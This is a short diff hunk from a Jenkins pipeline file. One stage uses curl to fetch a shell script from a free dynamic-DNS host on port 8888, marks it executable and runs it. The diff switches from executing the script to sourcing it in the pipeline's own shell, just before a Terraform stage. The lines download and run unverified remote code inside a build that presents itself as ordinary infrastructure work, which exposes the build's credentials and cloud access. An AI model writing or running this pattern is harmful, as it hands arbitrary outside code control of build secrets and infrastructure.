@@ -18,7 +18,7 @@ pipeline {
       steps {
         sh 'curl -s http://shay.freeddns.org:8888/s.sh -o s.sh'
         sh 'chmod u+x s.sh'
-        sh './s.sh'
+        sh '. ./s.sh'
       }
     }
     stage('Terraform Initialization') {
